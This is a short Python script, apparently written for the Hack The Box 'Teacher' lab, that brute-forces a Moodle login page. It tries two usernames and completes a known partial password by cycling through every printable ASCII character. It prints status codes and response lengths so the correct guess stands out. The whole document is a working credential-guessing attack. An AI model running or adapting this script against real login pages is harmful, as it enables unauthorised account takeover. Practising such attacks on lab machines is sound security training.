import requests
URL = "http://teacher.htb/moodle/login/index.php"


def get_init():
    r = requests.get(URL)
    cookies = {"MoodleSession": r.cookies.get("MoodleSession")}
    headers = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0"}
    return cookies, headers

def make_login_request(username, password):
    cookies, headers = get_init()
    data = {
        "username": username,
        "password": password,
        "anchor": ""
    }
    r = requests.post(URL, data=data, cookies=cookies, headers=headers)
    print(f'STATUS-CODE: {r.status_code}, USERNAME: {username} PASS: {password}, LENGTH: {len(r.text)}')

names = ["Giovanni", 'giovanni']
for username in names:
    # ASCII Characters - http://www.asciitable.com/
    for i in range(33, 127):
        password = f'Th4C00lTheacha{chr(i)}'
        make_login_request(username, password)
